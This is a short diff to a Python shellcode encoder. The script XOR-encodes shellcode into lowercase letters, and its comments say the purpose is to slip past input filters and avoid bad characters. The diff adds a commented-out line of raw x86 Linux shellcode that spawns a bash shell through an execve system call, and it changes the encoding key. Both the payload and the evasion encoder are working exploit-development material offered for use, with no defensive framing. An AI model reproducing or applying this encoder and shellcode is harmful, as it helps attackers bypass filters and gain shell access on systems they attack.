@@ -15,10 +15,12 @@ for i in range(20):
 	shellcode += bytes([i])
 shellcode = shellcode
 
+# shellcode = b"\x31\xc0\xb0\x68\x50\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
 # This scheme encrypts shellcode to only lowercase latin characters
 # to be able to slip through filters and avoid many badchars.
 
-key = 0x13
+key = 10
 
 # To encode 0x31 with key 0x52:
 # 0x31 ^ 0x52 = 0x63
@@ -76,4 +78,3 @@ if __name__ == "__main__":
 	print()
 	print('key: db 0x%.2x' % key)
 	print('shellcode: db "' + enc_shellcode + '"')
-
